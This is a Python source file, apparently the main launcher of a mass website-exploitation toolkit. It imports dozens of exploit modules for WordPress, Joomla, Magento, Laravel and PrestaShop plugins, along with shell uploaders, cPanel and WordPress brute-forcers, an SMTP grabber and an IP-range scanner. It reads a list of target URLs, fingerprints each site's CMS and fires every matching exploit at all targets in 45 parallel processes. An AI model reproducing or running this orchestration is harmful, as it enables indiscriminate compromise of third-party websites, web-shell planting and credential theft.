import sys,os,time,threading,re,requests,datetime,random
from multiprocessing import Pool,freeze_support
from iprange import ip_fuck
from colorama import Fore

def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][(os.name == 'nt')])

def print_time():
    waktu_sekarang = datetime.datetime.now()
    terminal_lebar = os.get_terminal_size().columns
    waktu_str = f"Waktu sekarang: {waktu_sekarang}"
    jumlah_spasi = terminal_lebar - len(waktu_str)
    waktu_di_kanan = " " * jumlah_spasi + waktu_str
    print(Fore.BLUE+waktu_di_kanan)
    
if not os.path.exists("result"):
    os.mkdir("result")

if not os.path.exists("cms"):
    os.mkdir("cms")

from tool import cms
from tool import get_smtp
from exploit import adminer
from exploit import apache
from exploit import cartabandonmentproOld
from exploit import cherry_plugin
from exploit import com_adsmanager
from exploit import magento
from exploit import sql
from exploit import dzs
from brute import cpanel
from exploit import image_magick
from exploit import laravel_exploit
from brute.wordpress import Wordpress
from exploit import Kramer
from exploit import mp3
from exploit import image_magick
from exploit import workreap
from exploit import Forminator
from exploit import buddypress
from exploit import wpwoocomercesoftware
from exploit import wp_user_frontend
from exploit import wp_ungaleri
from exploit import wp_template
from exploit import wp_prh
from exploit import wp_super
from exploit import arbitrary
from exploit import Wp_pagelines
from exploit import wp_mini
from exploit import wp_setup
from exploit import presta_wg
from exploit import c_shell_jomla
from exploit import b2j
from exploit import joomla0day
from exploit import joomlasmtp
from exploit import wp_shell_c
from exploit import idex_shell_c
from exploit import indexmax
from exploit import formcaft
from exploit import jce
from exploit import showbiz
wp = Wordpress()

def multistar(site):
    try:
        if site.startswith('http://'):
            site = site.replace('http://', '')
        elif site.startswith('https://'):
            site = site.replace('https://', '')
        check_cms = cms.DetectCMS(site)
        Kramer.main(site)
        b2j.main(site)
        mp3.main(site)
        idex_shell_c.main(site)
        if check_cms == 'laravel':
            laravel_exploit.exploit(site)
        elif check_cms == 'prestashop':
            presta_wg.main(site)
            cartabandonmentproOld.Exploit(site)
        elif check_cms == 'wordpress':
            showbiz.main(site)
            formcaft.main(site)
            wp_shell_c.main(site)
            wp_setup.main(site)
            wp_mini.main(site)
            Wp_pagelines.main(site)
            arbitrary.main(site)
            wp_super.main(site)
            wp_prh.main(site)
            wp_template.main(site)
            wp_ungaleri.Exploit(site)
            wp_user_frontend.main(site)
            wpwoocomercesoftware.main(site)
            buddypress.register(site)
            Forminator.main(site)
            dzs.main(site)
            wp.Run(site)
            cherry_plugin.Exploit(site)
            image_magick.main(site)
            workreap.upload_file(site)
            indexmax.Maper(site)
        elif check_cms == 'joomla':
            jce.main(site)
            joomlasmtp.main(site)
            c_shell_jomla.checker(site)
            com_adsmanager.Exploit(site)
            joomla0day.check(site)
        elif check_cms == "magento":
            magento.run(site)
        elif check_cms == 'unknown':
            sql.Exploit(site)
    except Exception as e:
        print(e)


def main():
    clear()
    try:
        m = [Fore.GREEN, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
        print_time()
        Target = input(f"{random.choice(m)}┌──(㉿kali)-[~/exploit]\n└─$ upload url: ")
        TEXTList = open(Target, 'r').read().splitlines()
        p = Pool(processes=45)
        p.map(multistar, TEXTList)
    except Exception as e:
        pass

if __name__ == '__main__':
    try:
        clear()
        print(f"{Fore.WHITE}1.{Fore.CYAN}Ip range")
        print(f"{Fore.WHITE}2.{Fore.BLUE}Exploit From File")
        x = input(f"[{Fore.CYAN}1 {Fore.WHITE}or {Fore.BLUE}2] what your choice: ")
        if "1" in x:
            clear()
            ip_fuck.makethread18()
        else:
            clear()
            main()
    except KeyboardInterrupt:
        sys.exit(0)
